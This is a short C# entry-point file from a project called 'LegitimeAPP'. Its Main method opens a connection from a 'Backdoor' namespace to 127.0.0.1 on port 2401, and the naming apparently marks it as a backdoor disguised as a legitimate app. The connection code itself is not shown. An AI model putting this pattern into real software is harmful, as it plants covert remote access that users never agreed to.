
using System ;
using LegitimeAPP.Backdoor ; 




namespace LegitimeAPP
{
    internal class Program
    {

        static void Main(string[] args)
        {
            _ = new Backdoor.Connection("127.0.0.1", 2401); 
        }
    }
}
